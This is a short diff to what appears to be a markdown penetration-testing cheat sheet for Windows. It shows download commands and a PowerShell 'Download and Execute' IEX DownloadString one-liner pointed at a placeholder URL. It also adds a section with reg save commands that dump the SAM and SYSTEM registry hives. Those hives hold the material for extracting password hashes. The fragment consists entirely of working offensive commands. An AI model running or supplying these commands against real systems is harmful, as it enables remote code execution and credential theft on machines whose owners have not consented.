@@ -130,6 +130,13 @@ certutil.exe -urlcache -split -f http://{URL} {NAME}.exe
 iwr http://{URL} -outfile {NAME}.exe
 powershell.exe IEX (New-Object Net.WebClient).DownloadFile("{URL}")
 ```
+
+#### Sam / System file dump
+```
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+```
+
 #### Download and Execute
 ```
 powershell.exe IEX (New-Object Net.WebClient).DownloadString("{URL}")
